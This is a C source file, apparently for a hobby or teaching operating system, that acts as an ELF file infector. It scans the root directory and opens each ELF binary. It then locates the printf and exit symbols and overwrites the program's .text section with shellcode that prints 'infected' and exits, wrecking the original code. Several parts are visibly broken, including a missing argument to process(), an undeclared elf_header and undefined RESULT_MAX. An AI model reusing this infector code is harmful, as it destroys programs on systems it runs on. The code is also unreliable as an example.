// #include "elf_local.h"
#include "stdio.h"
#include "string.h"
#include <elf.h>

int n_cmp(char *a, char *b, int n) {
    int i = 0;
    for (i = 0; i < n; i++) {
        if (a[i] != b[i]) {
            return 1;
        }
    }
    return 0;
}

int is_elf(Elf32_Ehdr elf_ehdr) {
    // e_ident = 0x7fELF
    return (n_cmp((char*)elf_ehdr.e_ident, (char*)ELFMAG, SELFMAG) == 0);
}

void cal_addr(int entry, int addr[]) {
    int cal_tmp = entry;
    int i;
    for (i = 0; i < 4; i++) {
        addr[i] = cal_tmp % 256;
        cal_tmp /= 256;
    }
}

void process(char *tmp);

int main() {
    char buf[RESULT_MAX] = {0};
    readdir("/", buf);
    char *files = buf + 3;

    int i = 0;
    int last = 0;
    char tmp[200];
    int count = 0;

    for (i = 1 /*0*/; i < strlen(files); i++) 
    {
        if (files[i] == ' ' && files[i - 1] != ' ') 
        {
            int j = last;
            for (; j < i; j++) {
                tmp[count++] = files[j];
            }

            tmp[count] = '\0';
            printf("%s\n", tmp);
            last = i + 1;
            // goto ifs;

            if (n_cmp(tmp, "dev", 3) != 0 &&
                n_cmp(tmp, "kernel.bin", 10) != 0) 
            {
                process();
            }
// ifs:
            count = 0;
        }
    }
    // __asm__ __volatile__("xchg %bx, %bx");
}

void xprocess(char *tmp)
{
    Elf32_Shdr symtab_section_header;
    Elf32_Shdr section_header;
    // Elf32_Ehdr elf_ehdr;
    Elf32_Shdr elf_shdr;
    // Elf32_Sym elf_sym;

    int old_file = open(tmp, O_RDWR);
    read(old_file, &elf_header, sizeof(elf_ehdr));
    if (!is_elf(elf_header)) return;

    // int e_sho_off = elf_ehdr.e_shoff;
    printf("--modifying\n");


    int e_sho_off = elf_ehdr.e_shoff;
    lseek(old_file, e_sho_off + sizeof(elf_shdr), SEEK_SET);
    if (read(old_file, &elf_shdr, sizeof(elf_shdr)) != sizeof(elf_shdr)) printf("sizeof(elf_shdr)\n");
    int text_offset = elf_shdr.sh_offset;
    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 7, SEEK_SET);
    if (read(old_file, &elf_shdr, sizeof(elf_shdr)) != sizeof(elf_shdr)) printf("sizeof(elf_shdr)\n");
    int str_offset = elf_shdr.sh_offset;
    char str_buf[1000];
    lseek(old_file, str_offset, SEEK_SET);
    if(read(old_file, str_buf, sizeof(str_buf)) != sizeof(str_buf)) printf("sizeof(str_buf)\n");



    for (int i = 0; i < elf_header.e_shnum; i++) {
        if (lseek(old_file, elf_header.e_shoff + (i * sizeof(Elf32_Shdr)), SEEK_SET) == -1) printf("lseek error");
        if (read(old_file, &section_header, sizeof(Elf32_Shdr)) != sizeof(Elf32_Shdr)) printf("Failed to read section header");

        // Check if the section is the symbol table section
        if (section_header.sh_type == SHT_SYMTAB) {
            symtab_section_header = section_header;
            break;
        }
    }
}

void process(char *tmp)
{
    Elf32_Ehdr elf_ehdr;
    Elf32_Shdr elf_shdr;
    Elf32_Sym elf_sym;
    
    int old_file = open(tmp, O_RDWR);
    read(old_file, &elf_ehdr, sizeof(elf_ehdr));

    if (!is_elf(elf_ehdr)) { printf("none-ELF\n"); return; }
    printf("--modifying\n");

    int e_sho_off = elf_ehdr.e_shoff;
    lseek(old_file, e_sho_off + sizeof(elf_shdr), SEEK_SET);
    if (read(old_file, &elf_shdr, sizeof(elf_shdr)) != sizeof(elf_shdr)) printf("sizeof(elf_shdr)\n");

    int text_offset = elf_shdr.sh_offset;
    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 7, SEEK_SET);
    if (read(old_file, &elf_shdr, sizeof(elf_shdr)) != sizeof(elf_shdr)) printf("sizeof(elf_shdr)\n");

    char str_buf[1000];
    int str_offset = elf_shdr.sh_offset;
    lseek(old_file, str_offset, SEEK_SET);
    if(read(old_file, str_buf, sizeof(str_buf)) != sizeof(str_buf)) printf("sizeof(str_buf)\n");

    int sym_num = (str_offset - (e_sho_off + sizeof(elf_shdr) * 8)) / 16;

    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 8, SEEK_SET);

    int i = 0;
    unsigned int printf_address, exit_address;
    int printf_flag = 0, exit_flag = 0;

    for (i = 0; i < sym_num; i++) 
    {
        if (read(old_file, &elf_sym, sizeof(elf_sym)) != sizeof(elf_sym)) printf("sizeof(elf_sym)\n");

printf("str_buf + elf_sym.st_name: %x\n", str_buf + elf_sym.st_name);
printf("st_name: %x\n", elf_sym.st_name);
printf("name: %s\n", str_buf + elf_sym.st_name);

        if (strcmp(str_buf + elf_sym.st_name, "printf") == 0)
        {
            printf_flag = 1;
            printf_address = elf_sym.st_value;
        }
        if (strcmp(str_buf + elf_sym.st_name, "exit") == 0) 
        {
            exit_flag = 1;
            exit_address = elf_sym.st_value;
        }
        if (printf_flag && exit_flag) 
        {
            break;
        }
    }

    if (i == sym_num) printf("can't find printf/exit\n");

    int printf_offset = printf_address - (text_offset + 0x12 + 5);
    int exit_offset = exit_address - (text_offset + 0x1e + 5);

    int printf_off[4]; cal_addr(printf_offset, printf_off);
    int exit_off[4]; cal_addr(exit_offset, exit_off);
    int data_addr[4]; cal_addr(text_offset + 35, data_addr);

    char shellcode[] = {
        0x66, 0x87, 0xdb, 0x89, 0xe5, 0x83, 0xe4, 0xf0, 0x83, 0xec, 0x10, 0xc7, 0x04, 0x24,
        data_addr[0],  data_addr[1],  data_addr[2],
        data_addr[3], 
        0xe8, 
        printf_off[0], printf_off[1], printf_off[2], printf_off[3],
        0xc7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xe8, 
        exit_off[0], exit_off[1],
        exit_off[2],
        exit_off[3],  
        // 0x69, 0x20, 0x61, 0x6d, 0x20,
        0x69, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, //  infected
        0x0A, 0x00 
    };
    lseek(old_file, text_offset, SEEK_SET);
    write(old_file, shellcode, sizeof(shellcode));
    printf("infect fin.\n");
}